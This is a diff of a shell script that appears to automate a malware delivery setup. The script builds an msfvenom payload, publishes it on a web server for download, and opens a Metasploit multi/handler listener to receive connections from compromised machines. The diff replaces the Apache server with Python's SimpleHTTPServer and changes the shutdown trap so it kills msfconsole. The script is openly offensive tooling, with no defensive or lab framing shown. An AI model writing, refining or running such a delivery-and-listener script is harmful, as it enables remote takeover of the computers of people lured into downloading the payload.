@@ -15,12 +15,8 @@ start_server() {
   echo "Web server started at http://$LOCAL_IP/"
   echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
 
-  # Start Apache web server
-  sudo systemctl start httpd
-
-  # Continuously print the access log to the terminal
-  echo "Visitors:"
-  sudo tail -f /var/log/httpd/access_log | awk '{print $1}'
+  # Start a simple Python web server
+  python -m SimpleHTTPServer 80
 }
 
 # Generate the payload using msfvenom
@@ -39,4 +35,4 @@ gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux
 start_server
 
 # Stop the web server and Metasploit listener when the script is terminated
-trap 'echo "Stopping web server and Metasploit listener..."; sudo systemctl stop httpd; exit' SIGINT
+trap 'echo "Stopping web server and Metasploit listener..."; sudo pkill -f "msfconsole"; exit' SIGINT
